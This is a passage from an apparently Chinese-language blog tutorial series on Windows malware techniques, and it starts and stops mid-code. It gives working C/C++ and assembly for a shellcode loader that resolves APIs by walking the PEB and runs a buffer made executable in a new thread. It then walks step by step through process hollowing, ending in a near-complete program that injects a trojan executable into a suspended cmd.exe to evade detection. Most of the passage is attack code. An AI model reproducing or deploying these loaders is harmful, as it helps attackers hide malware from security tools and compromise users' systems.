class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;填写x86的shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line">    HMODULE hKernal32 = <span class="built_in">GetKernel32Moudle</span>(); <span class="comment">// 获取Kernel32模块的地址</span></span><br><span class="line">    p_GetProcAddress GetProcAddress = (p_GetProcAddress)<span class="built_in">pGetProcAddress</span>(hKernal32); <span class="comment">// 获取GetProcAddress函数的地址</span></span><br><span class="line">    p_VirtualProtect VirtualProtect = (p_VirtualProtect)<span class="built_in">GetProcAddress</span>(hKernal32, <span class="string">&quot;VirtualProtect&quot;</span>);  <span class="comment">//获取VirtualProtect函数地址</span></span><br><span class="line">    p_CreateThread CreateThread = (p_CreateThread)<span class="built_in">GetProcAddress</span>(hKernal32, <span class="string">&quot;CreateThread&quot;</span>);  <span class="comment">//获取CreateThread函数地址</span></span><br><span class="line">    p_WaitForSingleObject WaitForSingleObject = (p_WaitForSingleObject)<span class="built_in">GetProcAddress</span>(hKernal32, <span class="string">&quot;WaitForSingleObject&quot;</span>);  <span class="comment">//获取WaitForSingleObject函数地址</span></span><br><span class="line"></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)buf, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)(LPVOID)buf, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="x64代码实现"><a href="#x64代码实现" class="headerlink" title="x64代码实现"></a>x64代码实现</h2><p>由于x64无法编写内联汇编代码, 因此需另创一个asm文件来进行编写</p>
<img src="shellcode加载器/image-20230505164445694.png" alt="image-20230505164445694" style="zoom:67%;" />		



<p>此处我创建了一个<code>GetInitializationOrderModuleList.asm</code>, 用于获取<code>InitializationOrderModuleList</code>, 其代码如下所示:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.CODE</span><br><span class="line">    GetInInitializationOrderModuleList PROC</span><br><span class="line">    mov rax,gs:[60h] ; PEB，注意，这里不能写0x60</span><br><span class="line">    mov rax,[rax+18h] ; PEB_LDR_DATA</span><br><span class="line">    mov rax,[rax+30h] ; InInitializationOrderModuleList</span><br><span class="line">    ret ; 这里不能写retn</span><br><span class="line">    GetInInitializationOrderModuleList ENDP</span><br><span class="line">END</span><br></pre></td></tr></table></figure>



<p>随后鼠标右键单击新建的asm文件, 选择属性, 在常规选项处将<code>从生成中排除</code>设置为<code>否</code>, 项类型设置为<code>自定义生成工具</code></p>
<img src="shellcode加载器/image-20230505164722633.png" alt="image-20230505164722633" style="zoom:67%;" />	



<p>在自定义生成工具选项处, 在命令行框输入:<code>ml64 /Fo $(IntDir)%(fileName).obj /c %(fileName).asm</code>, 在输出框输入:<code>$(IntDir)%(FileName).obj</code></p>
<img src="shellcode加载器/image-20230505165453883.png" alt="image-20230505165453883" style="zoom:67%;" />	



<p>打开项目属性，勾选<code>C/C++-&gt;代码生成-&gt;禁用安全检查</code></p>
<img src="shellcode加载器/image-20230505171010208.png" alt="image-20230505171010208" style="zoom:67%;" />	



<p>以下是shellcode加载代码</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// UNICODE_STRING 结构体定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> &#123;</span><br><span class="line">    USHORT Length;  <span class="comment">//表示字符串中的字符数,由于它是unicode形式的字符,因此每个字符占两个字节</span></span><br><span class="line">    USHORT MaximumLength;  <span class="comment">//分配的内存空间的大小，以字节为单位</span></span><br><span class="line">    PWSTR Buffer;  <span class="comment">//表示指向存储Unicode字符串的字符数组的指针</span></span><br><span class="line">&#125; UNICODE_STRING, * PUNICODE_STRING;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明获取 InInitializationOrderModuleList 链表的函数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">PVOID64 __stdcall <span class="title">GetInInitializationOrderModuleList</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 Kernel32.dll 的基地址</span></span><br><span class="line"><span class="function">HMODULE <span class="title">getKernel32Address</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取 InInitializationOrderModuleList 链表</span></span><br><span class="line">    LIST_ENTRY* pNode = (LIST_ENTRY*)<span class="built_in">GetInInitializationOrderModuleList</span>();</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取 FullDllName 成员</span></span><br><span class="line">        UNICODE_STRING* FullDllName = (UNICODE_STRING*)((BYTE*)pNode + <span class="number">0x38</span>);</span><br><span class="line">        <span class="comment">// 如果 Buffer 中的第 13 个字符为空字符，则已找到 Kernel32.dll</span></span><br><span class="line">        <span class="keyword">if</span> (*(FullDllName-&gt;Buffer + <span class="number">12</span>) == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 返回模块的基地址</span></span><br><span class="line">            <span class="keyword">return</span> (HMODULE)(*((ULONG64*)((BYTE*)pNode + <span class="number">0x10</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        pNode = pNode-&gt;Flink;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 GetProcAddress 函数的地址</span></span><br><span class="line"><span class="function">DWORD64 <span class="title">getGetProcAddress</span><span class="params">(HMODULE hKernal32)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取 DOS 头</span></span><br><span class="line">    PIMAGE_DOS_HEADER baseAddr = (PIMAGE_DOS_HEADER)hKernal32;</span><br><span class="line">    <span class="comment">// 获取 NT 头</span></span><br><span class="line">    PIMAGE_NT_HEADERS pImageNt = (PIMAGE_NT_HEADERS)((LONG64)baseAddr + baseAddr-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">// 获取导出表</span></span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((LONG64)baseAddr + pImageNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">    <span class="comment">// 获取导出函数地址数组、导出函数名数组和导出函数序号数组</span></span><br><span class="line">    PULONG RVAFunctions = (PULONG)((LONG64)baseAddr + exportDir-&gt;AddressOfFunctions);</span><br><span class="line">    PULONG RVANames = (PULONG)((LONG64)baseAddr + exportDir-&gt;AddressOfNames);</span><br><span class="line">    PUSHORT AddressOfNameOrdinals = (PUSHORT)((LONG64)baseAddr + exportDir-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历导出函数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; exportDir-&gt;NumberOfNames; i++) &#123;</span><br><span class="line">        <span class="comment">// 获取当前函数地址</span></span><br><span class="line">        LONG64 F_va_Tmp = (ULONG64)((LONG64)baseAddr + RVAFunctions[(USHORT)AddressOfNameOrdinals[i]]);</span><br><span class="line">        <span class="comment">// 获取当前函数名地址</span></span><br><span class="line">        PUCHAR FunctionName = (PUCHAR)((LONG64)baseAddr + RVANames[i]);</span><br><span class="line">        <span class="comment">// 如果当前函数名是 &quot;GetProcAddress&quot;，返回其地址</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="type">const</span> <span class="type">char</span>*)FunctionName, <span class="string">&quot;GetProcAddress&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> F_va_Tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义函数指针类型</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* pGetProcAddress)</span><span class="params">(HMODULE, LPCSTR)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* pVirtualProtect)</span><span class="params">(LPVOID, DWORD, DWORD, PDWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* pCreateThread)</span><span class="params">(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* pWaitForSingleObject)</span><span class="params">(HANDLE, DWORD)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 定义包含 shellcode 的缓冲区</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line">        <span class="string">&quot;填写x64的shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取 Kernel32.dll 的基地址和GetProcAddress函数地址</span></span><br><span class="line">    HMODULE hKernal32 = <span class="built_in">getKernel32Address</span>(); <span class="comment">// 获取Kernel32.dll的基地址</span></span><br><span class="line">    pGetProcAddress GetProcAddress = (pGetProcAddress)<span class="built_in">getGetProcAddress</span>(hKernal32); <span class="comment">// 获取GetProcAddress函数地址</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//获取其他所需API函数地址</span></span><br><span class="line">    pVirtualProtect VirtualProtect = (pVirtualProtect)<span class="built_in">GetProcAddress</span>(hKernal32, <span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">    pCreateThread CreateThread = (pCreateThread)<span class="built_in">GetProcAddress</span>(hKernal32, <span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">    pWaitForSingleObject WaitForSingleObject = (pWaitForSingleObject)<span class="built_in">GetProcAddress</span>(hKernal32, <span class="string">&quot;WaitForSingleObject&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//修改shellcode缓冲区的内存保护属性，以便执行</span></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)buf, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建新线程执行shellcode并等待其执行完成</span></span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)(LPVOID)buf, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="15-进程镂空注入"><a href="#15-进程镂空注入" class="headerlink" title="15.进程镂空注入"></a>15.进程镂空注入</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><p>进程镂空（Process Hollowing），又称为“傀儡进程”，是一种恶意软件（malware）利用的代码注入技术。它主要用于将恶意代码注入到合法进程中，以规避安全检测、提高恶意代码执行的隐蔽性和稳定性</p>
<h2 id="实现思路-2"><a href="#实现思路-2" class="headerlink" title="实现思路"></a>实现思路</h2><h3 id="1-创建挂起进程"><a href="#1-创建挂起进程" class="headerlink" title="1.创建挂起进程"></a>1.创建挂起进程</h3><p>创建一个新的目标进程（这里是cmd.exe），并将其创建为挂起状态，这样它的主线程不会立即执行</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">BOOL bRet = <span class="built_in">CreateProcessA</span>(</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    (LPSTR)<span class="string">&quot;cmd&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    FALSE,</span><br><span class="line">    CREATE_SUSPENDED,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    &amp;si,</span><br><span class="line">    &amp;pi);</span><br></pre></td></tr></table></figure>



<h3 id="2-读取恶意程序的内容"><a href="#2-读取恶意程序的内容" class="headerlink" title="2.读取恶意程序的内容"></a>2.读取恶意程序的内容</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读取恶意程序的内容至本进程内存中</span></span><br><span class="line">hFile = <span class="built_in">CreateFileA</span>(path, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>); <span class="comment">//获取替换可执行文件的大小</span></span><br><span class="line">FileImage = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"><span class="built_in">ReadFile</span>(hFile, FileImage, dwFileSize, &amp;FileReadSize, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取恶意程序的文件头信息(Dos头和Nt头)</span></span><br><span class="line">pDosHeaders = (PIMAGE_DOS_HEADER)FileImage;  <span class="comment">//获取Dos头</span></span><br><span class="line">pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)FileImage + pDosHeaders-&gt;e_lfanew); <span class="comment">//获取NT头</span></span><br></pre></td></tr></table></figure>



<h3 id="3-获取挂起进程的线程上下文和映像基址"><a href="#3-获取挂起进程的线程上下文和映像基址" class="headerlink" title="3.获取挂起进程的线程上下文和映像基址"></a>3.获取挂起进程的线程上下文和映像基址</h3><p>在挂起创建的进程中，<code>EBX</code>（在x86架构下）和<code>RDX</code>（在x64架构下）寄存器通常用于存储指向<code>PEB</code>（进程环境块）的指针。<code>PEB</code>是一个包含进程相关信息的数据结构，例如映像基地址、操作系统版本等。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取挂起进程的上下文</span></span><br><span class="line"><span class="built_in">GetThreadContext</span>(pi.hThread, &amp;ctx); </span><br><span class="line">  </span><br><span class="line"><span class="comment">//获取可执行</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Rdx + (<span class="built_in">sizeof</span>(SIZE_T) * <span class="number">2</span>)), &amp;RemoteImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 从rbx寄存器中获取PEB地址，并从PEB中读取可执行映像的基址</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// 从ebx寄存器中获取PEB地址，并从PEB中读取可执行映像的基址</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _X86_</span></span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Ebx + <span class="number">8</span>), &amp;RemoteImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<h3 id="4-卸载挂起进程的内存"><a href="#4-卸载挂起进程的内存" class="headerlink" title="4.卸载挂起进程的内存"></a>4.卸载挂起进程的内存</h3><p>如果挂起进程的映像基址和恶意程序的映像基址相同，则调用NtUnmapViewOfSection卸载原始进程映像</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断文件预期加载地址是否被占用</span></span><br><span class="line">pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtUnmapViewOfSection&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ((SIZE_T)RemoteImageBase == pNtHeaders-&gt;OptionalHeader.ImageBase)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">NtUnmapViewOfSection</span>(pi.hProcess, RemoteImageBase); <span class="comment">//卸载已存在文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="5-将恶意程序内容写入目标进程"><a href="#5-将恶意程序内容写入目标进程" class="headerlink" title="5.将恶意程序内容写入目标进程"></a>5.将恶意程序内容写入目标进程</h3><p>先将恶意程序的头部信息写入目标进程，随后逐节将恶意程序的各个节写入</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//为可执行映像分配内存,并写入文件头</span></span><br><span class="line">RemoteProcessMemory = <span class="built_in">VirtualAllocEx</span>(pi.hProcess, (PVOID)pNtHeaders-&gt;OptionalHeader.ImageBase, pNtHeaders-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(pi.hProcess, RemoteProcessMemory, FileImage, pNtHeaders-&gt;OptionalHeader.SizeOfHeaders, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//逐段写入</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pNtHeaders-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">pSectionHeaders = (PIMAGE_SECTION_HEADER)((LPBYTE)FileImage + pDosHeaders-&gt;e_lfanew + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS) + (i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER)));</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)((LPBYTE)RemoteProcessMemory + pSectionHeaders-&gt;VirtualAddress), (PVOID)((LPBYTE)FileImage + pSectionHeaders-&gt;PointerToRawData), pSectionHeaders-&gt;SizeOfRawData, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="6-更新目标进程的线程上下文"><a href="#6-更新目标进程的线程上下文" class="headerlink" title="6.更新目标进程的线程上下文"></a>6.更新目标进程的线程上下文</h3><p>将程序计数器（EAX&#x2F;RAX 或 ECX&#x2F;RCX 寄存器）设置为替换映像的入口点地址，并更新目标进程PEB中的映像基地址</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">    ctx.Rcx = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Rdx + (<span class="built_in">sizeof</span>(SIZE_T) * <span class="number">2</span>)), &amp;pNtHeaders-&gt;OptionalHeader.ImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _X86_</span></span><br><span class="line">    ctx.Eax = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Ebx + (<span class="built_in">sizeof</span>(SIZE_T) * <span class="number">2</span>)), &amp;pNtHeaders-&gt;OptionalHeader.ImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<p>设置目标进程的线程上下文，使其使用新的上下文信息</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SetThreadContext</span>(pi.hThread, &amp;ctx); <span class="comment">// 设置线程上下文</span></span><br></pre></td></tr></table></figure>



<h3 id="7-恢复目标进程的主线程"><a href="#7-恢复目标进程的主线程" class="headerlink" title="7.恢复目标进程的主线程"></a>7.恢复目标进程的主线程</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ResumeThread</span>(pi.hThread); <span class="comment">// 恢复挂起线程</span></span><br></pre></td></tr></table></figure>



<h2 id="完整代码-1"><a href="#完整代码-1" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* pNtUnmapViewOfSection)</span><span class="params">(HANDLE, PVOID)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">wchar_t</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="comment">// 定义变量和结构体</span></span><br><span class="line">    IN PIMAGE_DOS_HEADER pDosHeaders;</span><br><span class="line">    IN PIMAGE_NT_HEADERS pNtHeaders;</span><br><span class="line">    IN PIMAGE_SECTION_HEADER pSectionHeaders;</span><br><span class="line">    IN PVOID FileImage;</span><br><span class="line">    IN HANDLE hFile;</span><br><span class="line">    OUT DWORD FileReadSize;</span><br><span class="line">    IN DWORD dwFileSize;</span><br><span class="line">    IN PVOID RemoteImageBase;</span><br><span class="line">    IN PVOID RemoteProcessMemory;</span><br><span class="line">    STARTUPINFOA si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    CONTEXT ctx;</span><br><span class="line">    ctx.ContextFlags = CONTEXT_FULL;</span><br><span class="line">    si.cb = <span class="built_in">sizeof</span>(si);</span><br><span class="line">   </span><br><span class="line">    <span class="comment">//用于替换的恶意程序</span></span><br><span class="line">    <span class="type">char</span> path[] = <span class="string">&quot;E:\\muma.exe&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建挂起的cmd进程</span></span><br><span class="line">    BOOL bRet = <span class="built_in">CreateProcessA</span>(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        (LPSTR)<span class="string">&quot;cmd&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        FALSE,</span><br><span class="line">        CREATE_SUSPENDED,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        &amp;si,</span><br><span class="line">        &amp;pi);</span><br><span class="line">    </span><br><span class="line">    